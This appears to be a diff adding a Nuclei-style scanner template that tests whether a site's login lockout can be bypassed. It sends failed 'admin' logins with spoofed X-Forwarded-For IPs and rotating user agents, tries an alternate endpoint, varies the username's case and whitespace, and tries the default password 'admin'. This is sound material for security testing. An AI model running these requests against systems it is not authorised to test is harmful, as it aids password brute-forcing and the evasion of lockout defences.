@@ -1,0 +1,234 @@
+id: medium-auth-account-lockout-bypass-distributed
+
+info:
+  name: Account Lockout Bypass Distributed Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects account lockout bypass vulnerabilities using distributed attacks,
+    IP rotation, user-agent rotation, and timing-based bypasses. Tests for
+    weak lockout mechanisms that can be circumvented by red teams.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism
+    - https://portswigger.net/web-security/authentication/password-based
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
+    cvss-score: 5.3
+    cwe-id: CWE-307
+  metadata:
+    verified: true
+    max-request: 10
+  tags: account-lockout,bypass,distributed,brute-force,rate-limit,red-team
+
+variables:
+  user_agents: ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (X11; Linux x86_64)"]
+  fake_ips: ["192.168.1.100", "10.0.0.50", "172.16.0.25", "203.0.113.45"]
+
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        X-Forwarded-For: 192.168.1.100
+        X-Real-IP: 192.168.1.100
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","password":"wrongpass1"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
+        Content-Type: application/json
+        X-Forwarded-For: 10.0.0.50
+        X-Real-IP: 10.0.0.50
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","password":"wrongpass2"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+        Content-Type: application/json
+        X-Forwarded-For: 172.16.0.25
+        X-Real-IP: 172.16.0.25
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","password":"wrongpass3"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15
+        Content-Type: application/json
+        X-Forwarded-For: 203.0.113.45
+        X-Real-IP: 203.0.113.45
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","password":"wrongpass4"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        X-Forwarded-For: 8.8.8.8
+        X-Real-IP: 8.8.8.8
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","password":"wrongpass5"}
+
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+        Connection: close
+        
+        username=admin&password=wrongpass6
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        X-Forwarded-For: 127.0.0.1
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"ADMIN","password":"wrongpass7"}
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin ","password":"wrongpass8"}
+
+      - |
+        GET /api/auth/lockout-status/admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 65
+        Connection: close
+        
+        {"username":"admin","password":"admin"}
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: no-progressive-lockout
+        dsl:
+          - 'status_code_1 == 401 && status_code_2 == 401 && status_code_3 == 401'
+          - '!contains(body_1, "locked") && !contains(body_2, "locked") && !contains(body_3, "locked")'
+          - 'contains(body_1, "invalid") && contains(body_2, "invalid") && contains(body_3, "invalid")'
+        condition: and
+
+      - type: dsl
+        name: ip-based-bypass-successful
+        dsl:
+          - 'status_code_4 == 401 && status_code_5 == 401'
+          - '!contains(body_4, "account locked") && !contains(body_5, "account locked")'
+          - 'contains(body_4, "invalid") || contains(body_5, "invalid")'
+        condition: and
+
+      - type: dsl
+        name: endpoint-variation-bypass
+        dsl:
+          - 'status_code_6 == 401'
+          - '!contains(body_6, "locked") && !contains(body_6, "blocked")'
+          - 'contains(body_6, "invalid") || contains(body_6, "incorrect")'
+        condition: and
+
+      - type: dsl
+        name: case-sensitivity-bypass
+        dsl:
+          - 'status_code_7 == 401'
+          - '!contains(body_7, "locked")'
+          - 'contains(body_7, "invalid") || contains(body_7, "not found")'
+        condition: and
+
+      - type: dsl
+        name: whitespace-bypass
+        dsl:
+          - 'status_code_8 == 401'
+          - '!contains(body_8, "locked")'
+          - 'contains(body_8, "invalid") || contains(body_8, "user not found")'
+        condition: and
+
+      - type: dsl
+        name: lockout-status-exposed
+        dsl:
+          - 'status_code_9 == 200'
+          - 'contains(body_9, "locked") || contains(body_9, "attempts") || contains(body_9, "remaining")'
+          - 'contains(body_9, "false") || contains(body_9, "0")'
+        condition: and
+
+      - type: dsl
+        name: continued-attempts-allowed
+        dsl:
+          - 'status_code_10 == 401'
+          - '!contains(body_10, "account locked") && !contains(body_10, "too many attempts")'
+          - 'contains(body_10, "invalid") || contains(body_10, "incorrect")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: lockout-info
+        part: body
+        group: 1
+        regex:
+          - '"locked":\s*(true|false)'
+          - '"attempts_remaining":\s*([0-9]+)'
+          - '"lockout_time":\s*([0-9]+)'
+
+      - type: regex
+        name: error-messages
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"error":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+
+      - type: regex
+        name: rate-limit-headers
+        part: header
+        group: 1
+        regex:
+          - 'X-RateLimit-Remaining:\s*([0-9]+)'
+          - 'X-RateLimit-Reset:\s*([0-9]+)'
+          - 'Retry-After:\s*([0-9]+)'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
+          - status_code_9
+          - status_code_10
